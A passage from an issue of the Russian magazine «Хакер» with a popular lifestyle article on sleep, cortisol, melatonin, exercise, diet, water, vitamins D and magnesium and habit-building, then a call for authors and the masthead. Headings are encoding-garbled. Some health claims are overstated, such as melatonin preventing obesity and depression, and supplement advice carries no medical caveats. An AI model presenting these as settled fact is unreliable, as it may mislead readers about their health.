не терзать свою волю налажи вани ем режима сна и бодрствования, работы
и отды ха.
   Есть такое понятие — ГГН-ось, или ги поталамо-гипофизар но-надпочеч-
никовая ось. Это «стрес совая сис тема», которая регулирует выработку кор-
тизола. Кортизол — это гормон, отвечающий за нап ряжение, собранность,
концентрацию, противостояние стрессу, он также участвует в регули рова нии
давления, пищеварения, цик лов сна и бодрствования.
  Миф о совах и жаворонках сос лужил нам дур ную службу. Мы объявляем
свое нарушение работы ГГН-оси частью своей идентичнос ти и ухаем совой
до четырех утра, после это го отсыпаясь до обе да. Вот только при таком гра-
фике придется забыть об энергичности, ровном хорошем настроении и кон-
центрации без кофе и других сти муляторов.





В случае наруше ний, например в ответ на хронический стресс, ГГН-ось
начинает работать слишком активно, и у челове ка повышается средний уро-
вень кортизола. Вообще избыток кортизола гро зит множес твом неприятных
пос ледствий, в том числе гипертонией, проб лемами с иммунитетом и лишним
весом. А для темы сна важно, что кортизол может начать выделяться в непод-
ходящие моменты дня. При нормальных условиях уровень кортизола сни-
жается до минимума к 19–20 часам, а максимума достигает в районе 7 утра,
отче го в теории иде аль ный сферический человек в вакууме просыпается сам
без будильника.
  Но у «сов» уровень кортизола, наобо рот, под нима ется к вечеру, и тогда
они наконец-то чувствуют бодрость и готов ность к активной жизни. И вот
вечером и ночью «сова» или человек с бес сонницей занимается своими
делами, затем рано или поз дно уста лость пересиливает и человек засыпает.
Но из-за повышенного кортизола даже может, немного отдохнув, снова прос-
нуть ся среди ночи и не мочь уснуть обратно.
  Все это работает как усиливающая петля обратной связи: чем хуже ты
отды хаешь, тем боль ше стрес са, чем больше стрес са, тем хуже ты отды хаешь
и так далее. Поэтому нам нуж но работать со стрессом через все доступные
каналы, важнейший из которых — сон.


ÊÀ×ÅÑÒÂÅÍÍÛÉ ÑÎÍ

Навер няка ты слышал, что для засыпания челове ку нужен гормон мелатонин.
Мелатонин не толь ко помогает спать, но и пре дотвра щает стресс, деп-
рессию, ожирение, повышенное давление, к тому же улучшает имму нитет.





 • Ме лато нин и лиш ний вес
 • Обзоры исследований о противо воспалительной и антиоксидантной роли
   мелато нина
 • Ме лато нин и возрастные изменения сердца
 • Ме лато нин и кровяное давление
 • Ме лато нин и психическое здоровье



Выделе ние мелато нина зависит от уровня освещен ности — чем свет лее, тем
хуже он вырабатыва ется; причем больше всего мешает свет в сине-зеленой
части спектра.
  И даже если ты примешь таб летку мелато нина, без тем ноты она не сра-
бота ет.





Идеально, если, когда ты спишь, в комнате будет полная темнота. Да, даже
без огоньков роутера и отсве тов неоновой вывески «Пиво» от ларька
под окном. Понять, что такое полная тем нота, лег ко: твои открытые глаза
видят то же самое, что и закрытые, — то есть ничего, HEX 000000.
  А пос коль ку в нашей цивилизации ночь идет в комплекте с ули цей,
фонарем и круглосуточной аптекой, тебе при годят ся блэкаут-шторы, а для
стопроцентной тем ноты — маска для сна.




Синий свет по дав ляет выработ ку мелато нина и усиливает проблемы со сном.



Да, пару-тройку дней придется привыкать ко сну в маске, зато потом при выч-
ка заработает в обратную сторону и ты нач нешь быстро засыпать, едва надев
маску. Выбирай маску с углублением для глаз, она комфортнее всего и почти
не мешает.
  Особенно маска поможет тем, кто еще не наладил свой режим, так что
боль шая часть сна пока что при ходится на све товой день.
  Не забывай и о том, что спать лучше в тихой и хорошо проветренной ком-
нате, опти мальная температу ра воздуха для сна — не выше 23 °С.
  Перед сном лучше всего отказаться от голубых экра нов, ярко го света
и воз буждающих мозг игр и сериалов, посиделок с алкоголем, а также нап-
ряженной работы. Гораздо лучше подойдет чтение, прогулка и спокой ные
хоб би. При этом сле ди, что бы свет был неяркий и в желтой час ти спек тра.
   Итак, что меша ет качес твенно спать:
 • свет;
 • курение;
 • алкоголь;
 • ко феин;
 • некоторые лекарства;
 • переедание;
 • шум;
 • проблемы с поз воночником;
 • стресс;
 • наруше ния режима;
 • иг ры и фильмы перед сном;
 • активные занятия перед сном.

Что поможет тебе спать лучше:
 • маг ний перед сном;
 • 5-HTP  (предшественник  серото нина,  который  затем  пре обра зуется
   в мелатонин) пе ред сном;
 • ме дитация;
 • полная темнота;
 • прохлада;
 • све жий воз дух;
 • прогулка перед сном;
 • теп лая ванна перед сном, особен но с сульфатом магния;
 • легкий ужин за нес колько часов до сна;
 • постоянный режим сна и бодрствования, в том числе на выходных.


ÀÊÒÈÂÍÎÑÒÜ È ÑÈËÎÂÛÅ ÒÐÅÍÈÐÎÂÊÈ

Час от часу не легче! Режим, спорт, только про полезное питание не хватало.
Все верно, дальше будет и про питание, от него никуда не деться в этом раз-
говоре.
  Дви жение нас только необходимо нашему телу и разуму,  что, чтобы
перечис лить все процессы, которые ухудшаются без движения, — не хватит
целой статьи. Увы, движение пальцев по трекпаду недос таточно нагружает
мыш цы и не нор мализу ет лимфоток.
  Я не предлагаю заниматься скандинавской ходьбой в парке, да и все рав-
но тебя пока не возьмут в прог рамму «Активное дол голетие». Зато сде лать
десяток при седаний или прыжков пару раз в день смо жет любой. Если ты сов-
сем не спортивный человек, начни с минимального дей ствия, пусть оно будет
казаться даже слишком прос тым для тебя, но имен но так активность войдет
в привыч ку. А дальше пос тепен но захочет ся большего.
  Для борьбы со стрес сом, деп рессией и тревожностью особенно полез ны
силовые тре нировки — они помогают отработать накопившийся стресс
и поощряют нас выделением эндорфи нов, а также улучшают сон.




Силовые тре нировки снижают тре вожность, по мога ют при ГТР, ре комен-
дуемы врачами и облегча ют симптомы деп рессии.



ÅÄÀ

Ты — то, что ты ешь! Так что если ты не хочешь быть хрупким, липким и с
газами, то забей на чипсы, сла дос ти и газировку. Твой настоящий бро — нут-
ритивно плот ные про дукты, то есть содержащие как можно боль ше микронут-
риентов — витами нов, минералов и аминокислот — на каждую калорию.
  И если в этот момент у тебя в голове появи лись печальные образы
овсянки и куриной грудки из при вычного ПП (правильного питания), спешу
тебя обрадовать. Грудка не только сухая и низкокало рийная, но и не слишком
удовлетворяющая для тво его орга низма.





                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ



           КАК ХАКНУТЬ СВОЙ ОРГАНИЗМ,
                 ЧТОБЫ ЖИТЬ ЛУЧШЕ




Эта тема не так прос та, потому что если погружаться в нее, то начинают
играть роль усвояемость, биодос тупность, сов местимость и даже несов-
местимость нутриентов. Но в твоих силах исключить однозначно бесполез ные
и вредные продук ты и добавить полезные.
   Итак, продукты, богатые нутриентами:
 • внутренние органы животных, птичьи потроха;
 • травы и спе ции;
 • зе лень;
 • ово щи;
 • се мена и оре хи;
 • рыба и мореп родукты;
 • мясо и птица;
 • яй ца;
 • мас ла;
 • бобовые;
 • фрук ты.

Попробуй пару месяцев заполнять свою тарел ку именно этими продуктами
и пос мотри, как изменит ся твое самочувс твие и энергичность.
  Заметь, в списке нет круп, их можно добав лять по остаточному принципу,
но уж точно не брать за осно ву рациона. Крупы и каши не нас толь ко полез ны
и необходимы, как считали наши бабуш ки. Скорее они дешевы и дают
сытость в тяжелые вре мена.
   Что есть не сто ит:
 • сильно обра ботанную продук цию (длин ный состав и мно го калорий);
 • полуфабрикаты, заморо женные и не только;
 • муч ные и кондитер ские изделия;
 • сахар и сладости;
 • чип сы и другие снеки, если они не похожи на морковку, стебли сельдерея
   и тому подобные вещи.

Думаю, ты и сам неп лохо догады ваешь ся, что такое полезные натуральные
про дукты, а что такое вредная еда. Оста лось толь ко перестать обманывать
себя и счи тать, что это дело второстепен ное.





ÂÎÄÀ

Раз уж мы решили пройтись по пропис ным истинам, нель зя не упомянуть
воду! Пить достаточ но воды важно в том числе для мозга. Нех ватка жидкости
может ощущаться как уста лость, слабость, подав ленность, раз дражитель-
ность, ухудшение памяти и концен трации.
  Мно гие слы шали про норму два-три литра воды в день, но эта рекомен-
дация — типичный случай, когда журналист недопо нял информацию, получен-
ную от уче ных, и искаженная версия пошла в народ. Хлестать воду большими
бутылями вовсе не обязательно!
  Из этой нормы нуж но вычитать жидкую пищу и напит ки, да и вооб ще —
сей час врачи рекомендуют пить по жаж де, главное — всегда иметь воду
под рукой.
   Увы, многие из нас не различают чувс тво жаж ды и голода. Не осоз навая,
что хотят пить, люди без конца заглядывают в холодильник, чтобы что-то
пожевать, в то время как организму приходится извлекать жалкие кап ли жид-
кости из под сохших со вчера котлет. Если это твой слу чай, попробуй, когда
захотелось перекусить, сна чала выпить ста кан воды.





 • После про буж дения выпивай ста кан-другой воды.
 • Всег да носи с собой бутылку воды.
 • Вы пивай ста кан воды за полчаса-час до еды.
 • Пей, как толь ко чувствуешь жажду.
 • Попробуй пить воду вместо переку са.




ÊÎÍÒÐÀÑÒÍÛÉ ÄÓØ

Про контрастный душ мы знаем с самого детс тва — это непременный атрибут
чудако ватого деда-зожника, который бега ет с голым торсом до поздней осе-
ни, а зимой обтирается снегом. Такой NPC спа унит ся в каж дом третьем дво-
ре на тер ритории СНГ, и его затейливый скрипт действи тельно при носит ему
поль зу!





Че редование горячей и холод ной воды помогает улуч шить снабжение клеток
кислородом и питательными вещества ми, улучшает иммунитет, стимулирует
выработ ку эндорфинов, снижает стресс, растворяет плохое настроение
и апатию.
  Начинаем с теп лой воды комфортной температуры, постепенно и плавно
добавляем холодной, затем переходим к горячей воде и обратно. Заверши
душ холод ной водой и не увле кайся: пяти-десяти минут будет более чем дос-
таточно!
  Помни, что любая полезная вещь, доведенная до край нос ти, становится
опасной, так что сигать в прорубь вслед за дедом не нужно!


ÌÀÑÑÀÆ

Звучит странно, но массаж помога ет при депрессии и тре вожности. До кон ца
неизвестно, как это работа ет, но почему бы и нет? Если у тебя нет времени
куда-то ездить, массажист может прийти на дом со своим расклад ным сто-
лом.
   Ну а если это совсем не твоя история, попробуй осторожно разминать
плечи и шею самостоятельно, в том числе мышцы у основания черепа.
Это совсем не то же самое, что профессиональный массаж все го тела,
но хоть что-то.


ÂÈÒÀÌÈÍÛ

Ко неч но, ответствен ный человек должен пойти к врачу и сдать анализ
на дефициты. Но если по какой-то причине это невозможно, российской
осенью и зимой ты не про гадаешь с витамином D.





Про необходимость витами на D для усвоения каль ция слы шали многие.
Более интересно, что нехватка витами на D может быть связана с лишним
весом и множеством тя желых сос тояний, включая гипертензию и ауто-
иммунные заболевания.
  Для нас же глав ное, что при недос татке витами на D стра дает ментальное
здоровье и нервная система.





 • Ви тамин D и ментальное здоровье
 • Ви тамин D для борьбы с деп рессией и тревож ностью
 • Вли яние витамина D на ЦНС
 • Вли яние витами на D на развитие моз га и его работу во взрос лом воз-
   расте



Как получить витамин D:
 • проводить вре мя на сол нце;
 • есть жир ную рыбу и мореп родук ты, рыбью печень и рыбий жир;
 • есть гри бы, особен но лесные, а не выращен ные на грибной фер ме;
 • есть желтки яиц;
 • принимать добав ки;
 • ис поль зовать УФ-лампу.

Второй витамин для ментального здоровья — это магний. Когда его недос-
таточно, это про воцирует все тот же знакомый список проблем: стресс, апа-
тия, депрессия, тре вожность. Не говоря уже о проб лемах с сердцем, мыш-
цами и костями.
  Маг ний можно  получить из специальных витаминных добавок либо
из пищи, такой как:
 • темный шоколад;
 • авокадо;
 • оре хи и семена;
 • цельнозер новые и бобовые культуры;
 • то фу;
 • жир ная рыба;
 • лис товая зелень (кейл, шпи нат, салат, микрозелень);
 • бананы.

Добав ки с маг нием луч ше принимать на ночь. А если на ночь захочется при-
нять что-то еще — при ми ванну с магнием. «Английскую» или «эпсомскую»
соль с маг нием легко найти в аптеке или на маркетплейсах.


ÊÀÊ ÂÍÅÄÐßÒÜ ÍÎÂÛÅ ÏÐÈÂÛ×ÊÈ

Возможно, ты скажешь, что все эти рекомен дации банальны и всем давно
известны, но, к сожалению, просто знать их недостаточно — нуж но еще и
регулярно выполнять.
   Если тебе вдруг захочется при менить âñå советы из этой статьи, пожалуй-
ста, делай это дозированно. Не пытайся изменить все свои привыч ки одним
махом с понедельника. Даже ког да ты меня ешь свою рутину на более здо-
ровую и полезную, это тоже стресс для организма — нашу психику напряга ют
любые изменения.





Выбери одну-две вещи, которые ты хочешь внедрить в первую оче редь,
и сконцен трируй ся на них. Это изменит твое состояние и даст тебе больше
сил для дальнейших улучшений.
   Главное — не пер воначальный заряд мотивации, а регулярные маленькие
шаги. Чем про ще будет каждое действие на пути к цели, тем больше шансов,
что ты сделаешь его даже в самый тяжелый и утомительный день. К примеру,
если решил заняться спортом, пока не ставь себе цель подготовить ся
к марафо ну, пос тавь цель пройтись всего полчаса после работы. В какой-то
момент это станет слишком легко и тебе захочется сделать прогул ку длиннее
или даже пробежаться.
   Удостоверив шись, что новые при вычки при росли к твоему обра зу жизни
как родные, добав ляй еще пару новых по той же схе ме.


ÂÛÂÎÄÛ

Итак, мы узнали, как под держивать свое тело на максимальном уров не здо-
ровья и энергии. Если статья найдет своего читателя, то я обязательно вер-
нусь со вто рой частью, где от поддержания здоровья тела мы перейдем
к здоровью душев ному.
«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.




Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
    №11 (296)

          Андрей Письмен ный    Вален тин Холмогоров        Илья Русанен
              Главный редактор         Ведущий редактор             Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                      Ев гения Шарипова           yambuto
                        Литературный редактор         Бильд-редак тор
                                                   yambuto@gmail.com


                          MEGANEWS

                           Мария Нефёдо ва
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий-Стем-
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                  Анна Яковлева
                                  Директор по спец проектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                       Вопросы о подписке:      Воп росы о материалах:
                                 lapina@glc.ru               support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, стро ение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Оле гович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоко лам ское шоссе, дом 1, стро ение 1, этаж 8, помеще ние IX, комната 54, офис 7. Зарегистрировано в Федеральной службе
по надзору в сфере связи, информа цион ных технологий и массовых коммуника ций (Роскомнадзоре), сви детельство Эл № ФС77-67001 от 30.
08.2016 года. Мнение редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставля ются как информация
к размышлению. Лица, использующие дан ную информа цию в противо законных целях, могут быть прив лечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По воп росам лицензирования и получения прав на использование
редакцион ных материалов жур нала обра щайтесь по адресу: xakep@glc.ru. © Жур нал «Хакер», РФ, 2022